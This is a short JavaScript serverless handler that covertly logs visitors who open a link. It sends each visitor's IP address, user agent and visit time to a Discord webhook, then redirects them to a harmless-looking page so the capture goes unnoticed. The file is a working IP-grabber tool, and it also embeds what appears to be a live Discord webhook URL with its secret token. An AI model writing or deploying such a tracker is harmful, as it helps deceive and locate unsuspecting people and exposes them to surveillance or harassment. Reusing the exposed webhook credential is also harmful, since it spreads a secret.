import fetch from "node-fetch";

export default async function handler(req, res) {
  // Discord webhook URL
  const webhookURL = "https://discord.com/api/webhooks/1407793276383137892/PfiHeizQF7v8BnlpWjF5jSqXMPc_hG9FiayWGNmcdtsglh2UdDCQC2zCy2HNES9Qqcnz"; // <-- Replace this

  try {
    // Send info to Discord
    await fetch(webhookURL, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        content: `Someone clicked your link!\nIP: ${req.headers['x-forwarded-for'] || req.socket.remoteAddress}\nUser Agent: ${req.headers['user-agent']}\nTime: ${new Date().toLocaleString()}`
      }),
    });
  } catch (err) {
    console.error("Failed to send webhook:", err);
  }

  // Redirect the user to the real page
  res.writeHead(302, { Location: "https://pinkhearts.vercel.app/" });
  res.end();
}
